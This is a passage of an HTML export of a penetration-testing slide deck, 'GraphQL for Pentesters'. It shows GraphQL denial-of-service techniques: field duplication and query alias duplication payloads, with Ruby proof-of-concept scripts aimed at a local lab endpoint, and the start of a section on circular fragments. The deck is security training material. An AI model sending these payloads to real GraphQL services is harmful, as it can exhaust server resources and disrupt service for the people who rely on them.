</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section data-class="invert" data-paginate="true" data-theme="acceis" class="invert" data-marpit-pagination="70" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--theme:acceis;" data-marpit-advanced-background="background"><div data-marpit-advanced-background-container="true" data-marpit-advanced-background-direction="horizontal"><figure style="background-image:url(&quot;assets/dos-recursion_02.png&quot;);background-size:contain;"></figure></div></section></foreignObject><foreignObject width="1280" height="720"><section id="70" data-class="invert" data-paginate="true" data-theme="acceis" class="invert" data-marpit-pagination="70" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--theme:acceis;" data-marpit-advanced-background="content"></section>
</foreignObject><foreignObject width="1280" height="720" data-marpit-advanced-background="pseudo"><section data-class="invert" data-paginate="true" data-theme="acceis" class="invert" data-marpit-pagination="70" data-marpit-pagination-total="104" style="" data-marpit-advanced-background="pseudo"></section></foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="71" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="71" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<h3>Denial of Service - Field duplication attack</h3>
<pre><code class="language-graphql">query {
  pastes {
    ipAddr # 1
    ipAddr # 2
    # ...
    ipAddr # 1000
  }
}
</code></pre>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="72" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="72" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<p>Ruby PoC for field duplication:</p>
<pre><code class="language-ruby"><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;httpx&#x27;</span>

copy_level = <span class="hljs-number">6000</span>
copy_pattern = <span class="hljs-string">&#x27;ipAddr,&#x27;</span>
payload = copy_pattern * copy_level

data = { <span class="hljs-string">&#x27;query&#x27;</span> =&gt; <span class="hljs-string">&quot;query{pastes{<span class="hljs-subst">#{payload}</span>}}&quot;</span>}

HTTPX
  .plugin(<span class="hljs-symbol">:proxy</span>)
  .with_proxy(<span class="hljs-symbol">uri:</span> <span class="hljs-string">&#x27;http://127.0.0.1:8080&#x27;</span>)
  .with(<span class="hljs-symbol">timeout:</span> { <span class="hljs-symbol">operation_timeout:</span> <span class="hljs-number">120</span> })
  .post(<span class="hljs-string">&#x27;http://noraj.test:5013/graphql&#x27;</span>, <span class="hljs-symbol">json:</span> data)
</code></pre>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section data-class="invert" data-paginate="true" data-theme="acceis" class="invert" data-marpit-pagination="73" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--theme:acceis;" data-marpit-advanced-background="background"><div data-marpit-advanced-background-container="true" data-marpit-advanced-background-direction="horizontal"><figure style="background-image:url(&quot;assets/field-duplication.png&quot;);background-size:contain;"></figure></div></section></foreignObject><foreignObject width="1280" height="720"><section id="73" data-class="invert" data-paginate="true" data-theme="acceis" class="invert" data-marpit-pagination="73" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--theme:acceis;" data-marpit-advanced-background="content"></section>
</foreignObject><foreignObject width="1280" height="720" data-marpit-advanced-background="pseudo"><section data-class="invert" data-paginate="true" data-theme="acceis" class="invert" data-marpit-pagination="73" data-marpit-pagination-total="104" style="" data-marpit-advanced-background="pseudo"></section></foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="74" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="74" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<h3>Denial of Service - Query aliases duplication attack</h3>
<p>Alternative if batching is disabled.</p>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="75" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="75" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<pre><code class="language-graphql">query {
  q1: systemUpdate
  q2: systemUpdate
  q3: systemUpdate
}
</code></pre>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="76" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="76" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<p>Ruby PoC for query aliases duplication:</p>
<pre><code class="language-ruby"><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;httpx&#x27;</span>

copy_level = <span class="hljs-number">3</span>
query = <span class="hljs-string">&#x27;systemUpdate&#x27;</span>
payload = (<span class="hljs-number">1</span>..copy_level).map { <span class="hljs-params">|i|</span> <span class="hljs-string">&quot;q<span class="hljs-subst">#{i}</span>:<span class="hljs-subst">#{query}</span>&quot;</span> }.join(<span class="hljs-string">&#x27;,&#x27;</span>)
data = { <span class="hljs-string">&#x27;query&#x27;</span> =&gt; <span class="hljs-string">&quot;query{<span class="hljs-subst">#{payload}</span>}&quot;</span>}

HTTPX
  .plugin(<span class="hljs-symbol">:proxy</span>)
  .with_proxy(<span class="hljs-symbol">uri:</span> <span class="hljs-string">&#x27;http://127.0.0.1:8080&#x27;</span>)
  .with(<span class="hljs-symbol">timeout:</span> { <span class="hljs-symbol">operation_timeout:</span> <span class="hljs-number">120</span> })
  .post(<span class="hljs-string">&#x27;http://noraj.test:5013/graphql&#x27;</span>, <span class="hljs-symbol">json:</span> data)
</code></pre>

<h3>Denial of Service - Circular fragments attack</h3>
<p>The Spread operator (<code>...</code>) allows to reuse fragments. It's like a mixin.</p>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>

</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="78" data-class="invert" data-paginate="true" data-header="![height:20px](themes/logo_acceis_white.svg)" data-footer="**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj)" data-theme="acceis" class="invert" data-marpit-pagination="78" data-marpit-pagination-total="104" style="--class:invert;--paginate:true;--header:![height:20px](themes/logo_acceis_white.svg);--footer:**GraphQL for Pentesters** - 22/11/2022 - Alexandre ZANNI (@noraj);--theme:acceis;">
<header><img src="themes/logo_acceis_white.svg" alt="" style="height:20px;" /></header>
<pre><code class="language-graphql">fragment smallPaste on PasteObject {
  id
  title
  content
}
query allPastes {
  pastes {
    ...smallPaste
  }
}
query allPastesWithStatus {
  pastes {
    public
    ...smallPaste
  }
}
</code></pre>
<footer><strong>GraphQL for Pentesters</strong> - 22/11/2022 - Alexandre ZANNI (@noraj)</footer>
